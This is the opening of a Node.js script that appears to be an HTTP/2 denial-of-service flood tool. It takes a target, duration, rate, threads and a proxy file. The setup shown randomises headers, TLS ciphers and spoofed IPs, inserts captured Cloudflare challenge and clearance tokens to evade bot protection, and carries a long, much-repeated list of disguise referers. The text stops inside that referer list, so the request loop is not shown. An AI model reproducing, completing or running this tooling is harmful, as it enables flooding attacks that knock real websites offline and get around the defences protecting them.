 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 var path = require("path");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');

const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
     //ua: process.argv[7]
 }
 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256",
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 ];
 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 const queryStrings = [
  "&",
  "=",
  "?",
  "/",
  "!",
  "cf-chl",
  "cf-chl-rc",
  "cf-clearance",
  "cf-ray",
  "cf-request-id",
  "cf-visitor",
  "cf-connecting-ip",
  "cf-ipcountry",
 ];
 const pathts = ["?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
"?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
"?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
"?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
"?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
"?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
"?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
"?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
"?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
"?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
"?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
"?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
"?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
"?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
"?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
"?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
"?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
"?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04"
 ];  
 
 const refers = [
		"http://www.google.com/?q=",
		"https://wordpress.org",
		"https://microsoft.com",
		"https://mozilla.org",
		"https://cloudfare.com",
		"https://en.wikipedia.org",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.google.com/",
        "http://duckduckgo.com/",
        "http://search.yahoo.com/search?p=",
        "http://swisscows.com/en/web?query=",
        "http://gibiru.com/results.html?q=",
        "http://www.bing.com/",
        "http://pornhub.com/",
        "http://www.google.co.ao/search?q=",
        "http://steamcommunity.com/market/search?q=",
        "http://vk.com/profile.php?redirect=",
        "http://www.cia.gov/index.html",
        "http://check-host.net/",
        "http://www.xnxx.com/",
        "http://youtube.com/",
        "http://www.baidu.com/",
        "http://www.google.ru/?hl=ru&q=",
        "http://yandex.ru/yandsearch?text=",
        "http://www.shodanhq.com/search?q=",
        "http://ytmnd.com/search?q=",
        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://developers.google.com/speed/pagespeed/insights/?url=",
        "http://help.baidu.com/searchResult?keywords=",
        "https://play.google.com/store/search?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.reddit.com/search?q=",
        "http://www.bestbuytheater.com/events/search?q=",
        "https://careers.carolinashealthcare.org/search?q=",
        "http://jobs.leidos.com/search?q=",
        "http://jobs.bloomberg.com/search?q=",
        "https://www.pinterest.com/search/?q=",
        "http://millercenter.org/search?q=",
        "https://www.npmjs.com/search?q=",
        "http://www.evidence.nhs.uk/search?q=",
        "http://www.ted.com/search?q=",
        "'http://funnymama.com/search?q=",
        "http://itch.io/search?q=",
        "http://jobs.rbs.com/jobs/search?q=",
        "http://taginfo.openstreetmap.org/search?q=",
        "https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
		"http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.google.com/",
        "http://duckduckgo.com/",
        "http://search.yahoo.com/search?p=",
        "http://swisscows.com/en/web?query=",
        "http://gibiru.com/results.html?q=",
        "http://www.bing.com/",
        "http://pornhub.com/",
        "http://www.google.co.ao/search?q=",
        "http://steamcommunity.com/market/search?q=",
        "http://vk.com/profile.php?redirect=",
        "http://www.cia.gov/index.html",
        "http://check-host.net/",
        "http://www.xnxx.com/",
        "http://youtube.com/",
        "http://www.baidu.com/",
        "http://www.google.ru/?hl=ru&q=",
        "http://yandex.ru/yandsearch?text=",
        "http://www.shodanhq.com/search?q=",
        "http://ytmnd.com/search?q=",
        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://developers.google.com/speed/pagespeed/insights/?url=",
        "http://help.baidu.com/searchResult?keywords=",
        "https://play.google.com/store/search?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.reddit.com/search?q=",
        "http://www.bestbuytheater.com/events/search?q=",
        "https://careers.carolinashealthcare.org/search?q=",
        "http://jobs.leidos.com/search?q=",
        "http://jobs.bloomberg.com/search?q=",
        "https://www.pinterest.com/search/?q=",
        "http://millercenter.org/search?q=",
        "https://www.npmjs.com/search?q=",
        "http://www.evidence.nhs.uk/search?q=",
        "http://www.ted.com/search?q=",
        "'http://funnymama.com/search?q=",
        "http://itch.io/search?q=",
        "http://jobs.rbs.com/jobs/search?q=",
        "http://taginfo.openstreetmap.org/search?q=",
        "https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=", 
		"http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.google.com/",
        "http://duckduckgo.com/",
        "http://search.yahoo.com/search?p=",
        "http://swisscows.com/en/web?query=",
        "http://gibiru.com/results.html?q=",
        "http://www.bing.com/",
        "http://pornhub.com/",
        "http://www.google.co.ao/search?q=",
        "http://steamcommunity.com/market/search?q=",
        "http://vk.com/profile.php?redirect=",
        "http://www.cia.gov/index.html",
        "http://check-host.net/",
        "http://www.xnxx.com/",
        "http://youtube.com/",
        "http://www.baidu.com/",
        "http://www.google.ru/?hl=ru&q=",
        "http://yandex.ru/yandsearch?text=",
        "http://www.shodanhq.com/search?q=",
        "http://ytmnd.com/search?q=",
        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://developers.google.com/speed/pagespeed/insights/?url=",
        "http://help.baidu.com/searchResult?keywords=",
        "https://play.google.com/store/search?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.reddit.com/search?q=",
        "http://www.bestbuytheater.com/events/search?q=",
        "https://careers.carolinashealthcare.org/search?q=",
        "http://jobs.leidos.com/search?q=",
        "http://jobs.bloomberg.com/search?q=",
        "https://www.pinterest.com/search/?q=",
        "http://millercenter.org/search?q=",
        "https://www.npmjs.com/search?q=",
        "http://www.evidence.nhs.uk/search?q=",
        "http://www.ted.com/search?q=",
        "'http://funnymama.com/search?q=",
        "http://itch.io/search?q=",
        "http://jobs.rbs.com/jobs/search?q=",
        "http://taginfo.openstreetmap.org/search?q=",
        "https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
		"http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.google.com/",
        "http://duckduckgo.com/",
        "http://search.yahoo.com/search?p=",
        "http://swisscows.com/en/web?query=",
        "http://gibiru.com/results.html?q=",
        "http://www.bing.com/",
        "http://pornhub.com/",
        "http://www.google.co.ao/search?q=",
        "http://steamcommunity.com/market/search?q=",
        "http://vk.com/profile.php?redirect=",
        "http://www.cia.gov/index.html",
        "http://check-host.net/",
        "http://www.xnxx.com/",
        "http://youtube.com/",
        "http://www.baidu.com/",
        "http://www.google.ru/?hl=ru&q=",
        "http://yandex.ru/yandsearch?text=",
        "http://www.shodanhq.com/search?q=",
        "http://ytmnd.com/search?q=",
        "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
        "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "https://developers.google.com/speed/pagespeed/insights/?url=",
        "http://help.baidu.com/searchResult?keywords=",
        "https://play.google.com/store/search?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.reddit.com/search?q=",
        "http://www.bestbuytheater.com/events/search?q=",
        "https://careers.carolinashealthcare.org/search?q=",
        "http://jobs.leidos.com/search?q=",
        "http://jobs.bloomberg.com/search?q=",
        "https://www.pinterest.com/search/?q=",
        "http://millercenter.org/search?q=",
        "https://www.npmjs.com/search?q=",
        "http://www.evidence.nhs.uk/search?q=",
        "http://www.ted.com/search?q=",
        "'http://funnymama.com/search?q=",
        "http://itch.io/search?q=",
        "http://jobs.rbs.com/jobs/search?q=",
        "http://taginfo.openstreetmap.org/search?q=",
        "https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
